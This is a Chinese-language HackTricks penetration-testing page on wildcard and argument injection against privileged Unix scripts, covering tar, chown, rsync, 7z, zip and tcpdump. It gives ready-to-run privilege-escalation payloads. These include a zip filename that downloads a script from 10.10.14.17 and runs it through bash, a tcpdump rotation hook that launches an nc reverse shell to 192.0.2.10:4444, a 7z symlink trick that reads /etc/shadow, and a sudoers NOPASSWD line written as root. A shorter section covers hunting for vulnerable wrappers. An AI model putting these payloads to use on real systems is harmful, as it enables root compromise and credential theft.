# 通配符实用技巧

{{#include ../../banners/hacktricks-training.md}}

> 当特权脚本使用未加引号的通配符（如 `*`）运行 `tar`、`chown`、`rsync`、`zip`、`7z` 等 Unix 二进制程序时，就会发生通配符（又称 *glob*）**argument injection**。  
> 由于 shell 会在执行二进制程序**之前**展开通配符，能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被当作**选项而非数据**，从而注入任意标志，甚至命令。<sup>[[6]](#references)</sup>  
> 本页汇总了 2023 至 2025 年最实用的原语、最新研究和现代检测方法。

## chown / chmod

当通配符展开时，利用看起来像选项的文件名触发 `--reference` 标志，即可**从参考文件复制所有者/组或权限位**。<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

当 root 随后执行类似以下命令时：

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

展开后的 `--reference=.drf.php` 会覆盖显式指定的所有者/模式，使匹配的文件继承 `.drf.php` 的元数据（并且在上述设置中，使攻击者能够写入这些文件）。<sup>[[6]](#references)</sup>

检查整个特权 helper，而不只是它的 `chown` 行。更改所有权可能会清除 set-user-ID 或 set-group-ID 位；[POSIX 将特权场景留给实现定义](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html)。同一任务中后续的 `chmod` 可能会在之前选中的文件上恢复这些位，从而改变结果。在将其视为可执行的提权路径之前，请确认实际的命令顺序、可写的 glob 目录、受影响文件及链接的处理方式、最终所有者和模式，以及挂载是否支持 set-user-ID。无法读取 helper 时，这些步骤就无法确定。

*PoC 和工具*：[`wildpwn`](https://github.com/localh0t/wildpwn)（组合攻击）。<sup>[[7]](#references)</sup>
详情另见经典的 DefenseCode 论文。<sup>[[6]](#references)</sup>

---

## 特权脚本中的 GNU `cp`

检查以 root 身份运行的脚本：如果它从调用者选择的工作目录中使用裸 glob 进行复制，例如 `cp .version * /etc/app/staged/`，而低权限用户能在那里创建文件名，就需要特别留意。GNU `cp` 可能会将由 `*` 展开、以连字符开头的文件名解析为选项。其 `--preserve=mode` 选项可以在创建副本时保留源文件的模式位，而 `--target-directory` 可以更改复制目标。这两种效果都需要根据具体脚本分支、目标状态、有效权限、文件系统策略和 GNU `cp` 的行为进行验证；仅凭 sudo 规则或脚本内容并不能证明可以提权。对于 GNU `cp`，在操作数前加上 `./` 或用 `--` 结束选项解析，可以避免将这种以连字符开头的文件名解释为选项（[GNU Coreutils 常见问题](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html)，[`cp` 手册](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)）。

---

## tar

### GNU tar

滥用 GNU tar 的 **checkpoint** 功能和 checkpoint actions 执行任意命令。<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override 注意事项

基于 `libarchive` 的新版 macOS 默认 `tar` 不提供 GNU tar 的 `--checkpoint` 接口，但 bsdtar 文档说明可使用 **--use-compress-program** 选择外部压缩程序。<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
当特权脚本运行 `tar -cf backup.tar *` 时，它会通过受害者的 `PATH` 选中 `sh`，并由 bsdtar 将其作为压缩程序启动。<sup>[[11]](#references)</sup> 这证明了 option injection，但本身并不是可靠的 arbitrary-command primitive：通配符生成的文件名不能包含 `/`，而 bsdtar 提供的是归档数据，并非攻击者指定的 shell 命令。要实现代码执行，还需要通过 `PATH` 解析到攻击者可控的可执行文件，或通过其他参数通道指定一个有用的程序。

---

## rsync

`rsync` 允许通过 `-e` 和 `--rsync-path` 等命令行标志覆盖远程 shell 或远程二进制文件。<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

如果 root 随后运行 `rsync -az * backup:/srv/` 来归档该目录，注入的 flag 可以通过 remote-shell 机制运行 shell。<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*：[`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` 模式）。

---

## 7-Zip / 7z / 7za

即使特权脚本采取了*防御措施*，在通配符前添加 `--`（以阻止解析选项），7-Zip CLI 仍接受以 `@` 为前缀的**文件列表文件**。将其与符号链接结合，即可*窃取任意文件*。<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

如果 root 执行类似这样的命令：

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取，然后退出，**并将内容打印到 stderr**。<sup>[[13]](#references)</sup>

即使使用 `-- *`，这种方式仍然有效，因为 7-Zip CLI 明确接受普通文件名和 `@listfiles` 作为位置参数输入，因此像 `@root.txt` 这样的字面文件名仍会被特殊处理。<sup>[[13]](#references)</sup>

---

## zip

当应用程序将用户控制的文件名传递给 `zip` 时（通过通配符或不带 `--` 地枚举文件名），有两种非常实用的原语。<sup>[[2]](#references)[[3]](#references)</sup>

- 通过 test hook 实现 RCE：`-T` 启用“测试归档”，而 `-TT <cmd>` 会将测试程序替换为任意程序（长选项形式：`--unzip-command <cmd>`）。如果你能注入以 `-` 开头的文件名，就把这些标志拆分到不同的文件名中，以便短选项解析正常工作。<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

说明
- 不要尝试使用单个文件名 `'-T -TT <cmd>'`——短选项会按字符解析，因此会失败。请像示例中那样使用单独的参数。<sup>[[3]](#references)</sup>
- 如果应用会从文件名中剥除斜杠，请从裸主机/IP 获取内容（默认路径为 `/index.html`），并使用 `-O` 保存到本地，然后执行。<sup>[[3]](#references)</sup>
- 你可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）调试解析过程，以了解这些参数是如何被处理的。<sup>[[3]](#references)</sup>

示例（zip 3.0 的本地行为）。<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak：如果 Web 层会回显 `zip` 的 stdout/stderr（天真的 wrapper 中很常见），注入 `--help` 等 flags，或使用错误选项导致的失败信息，就会出现在 HTTP 响应中，从而确认命令行注入并帮助调整 payload。<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

当特权 wrapper 使用 wildcard 展开可写目录时，值得检查以下文档记录的选项钩子。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | 可滥用的 Flag | 效果 |
| --- | --- | --- |
| `flock` | `-c <cmd>` | 将命令字符串传递给 shell |
| `git`   | `-c core.sshCommand=<cmd>` | 在 Git fetch/push 时使用 `<cmd>` 代替 SSH |
| `scp`   | `-S <program>` | 使用备用的、兼容 SSH 的连接程序 |

除了经典的 *tar/rsync/zip* 之外，也值得检查这些原语。

---

## Hunting vulnerable wrappers and jobs

近期的案例分析和检测指南表明，wildcard/argv injection 不再只是 **cron + tar** 问题。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 同类 bug 仍会出现在：

- 从攻击者可控的上传目录中“将所有内容下载为 zip/tar”的 Web 功能
- 暴露 tcpdump wrapper 的供应商设备/专用设备调试 shell，其中的文件名/过滤器字段由攻击者控制
- 在可写目录上调用 `tar`、`rsync`、`7z`、`zip`、`chown` 或 `chmod` 的备份或轮转任务

实用的排查命令（`pspy` 调用使用其文档说明的进程/文件事件及间隔 flags）。<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

快速判断：

- `-- *` 对许多 GNU 工具来说是很好的修复方法，但对 `7z`/`7za` **无效**，因为它们会单独解析 `@listfiles`。<sup>[[13]](#references)</sup>
- 对于 `zip`，检查是否有 wrapper 会直接枚举用户可控的文件名；即使没有 shell glob，短选项拆分（`-T` + `-TT <cmd>`）仍然有效。<sup>[[2]](#references)[[3]](#references)</sup>
- 对于 `tcpdump`，特别留意允许你控制**输出文件名**、**轮转设置**或**捕获文件回放**参数的 wrapper。<sup>[[18]](#references)</sup>

---

## tcpdump 轮转钩子（-G/-W/-z）：wrapper 中通过 argv injection 实现 RCE

当受限 shell 或供应商提供的 wrapper 通过拼接用户可控字段（例如“文件名”参数）来构造 `tcpdump` 命令行，却没有进行严格的引用处理或验证时，你可以偷偷传入额外的 `tcpdump` 标志。组合使用 `-G`（基于时间的轮转）、`-W`（限制文件数量）和 `-z <cmd>`（轮转后的命令），即可作为运行 tcpdump 的用户执行任意命令（设备上通常是 root）。<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

前提条件：

- 你可以影响传递给 `tcpdump` 的 `argv`（例如，通过 `/debug/tcpdump --filter=... --file-name=<HERE>` 这样的 wrapper）。<sup>[[4]](#references)[[18]](#references)</sup>
- wrapper 不会清理文件名字段中的空格或以 `-` 开头的 token。<sup>[[4]](#references)</sup>

经典 PoC（从可写路径执行 reverse shell 脚本）。<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

细节：

- `-G 1` 每秒轮转一次，`-W 1` 则在轮转一个文件后停止；捕获必须在轮转前收到匹配的数据包。<sup>[[18]](#references)</sup>
- `-z <cmd>` 会在每次轮转后运行一次命令，并将已关闭的 savefile 路径作为参数传入；请确保脚本/解释器的参数处理方式与 payload 相符。<sup>[[18]](#references)</sup>

无需可移动介质的变体：

- 如果你有其他写入文件的 primitive（例如允许输出重定向的独立命令包装器），将脚本写入已知路径，并触发 `-z /path/script.sh`；必要时让脚本自行调用 `/bin/sh`。<sup>[[18]](#references)</sup>
- 如果厂商包装器允许你选择轮转后的路径，请仅在同时存在会解析其 savefile 参数的 post-rotate 命令时审查路径控制；单靠路径控制不会执行文件内容。<sup>[[18]](#references)</sup>

---

## sudoers：带通配符/额外参数的 tcpdump → 任意读写和 root

sudoers 反模式示例：<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

该规则仍允许使用 tcpdump 文档中记录的若干选项：<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob 和宽松模式只限制第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个生效。<sup>[[3]](#references)[[18]](#references)</sup>
- 该规则没有限制其他选项，因此允许使用 `-Z`、`-r`、`-V` 等。<sup>[[3]](#references)[[18]](#references)</sup>

相关原语如下所述。<sup>[[3]](#references)[[18]](#references)</sup>
- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers 规则）。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 在第一个 `-w` 中使用路径遍历，逃出受限目录树。<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 使用 `-Z root` 强制设置输出文件的所有者（可在任意位置创建归 root 所有的文件）。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 通过 `-r` 重放精心构造的 PCAP，实现任意内容写入（例如，添加一行 sudoers 配置）。<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>创建包含精确 ASCII 载荷的 PCAP，并以 root 身份写入</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 通过 `-V <file>` 实现任意文件读取/机密 leak（将其解释为保存文件列表）。错误诊断信息通常会回显行内容，导致内容 leak。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump：通过 zip 参数注入实现 RCE + tcpdump sudo 配置错误提权](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 完整 Exploit 链](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - 检测到通过通配符注入执行潜在 Shell](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [回到未来：Unix 通配符失控（DefenseCode）](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` 命令用法](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` 命令用法](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar 检查点](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) 手册](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) 手册](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip 命令行语法](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) 手册](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git 配置文档](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` 手册](https://man.openbsd.org/scp)
- [18] [tcpdump(8) 手册](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
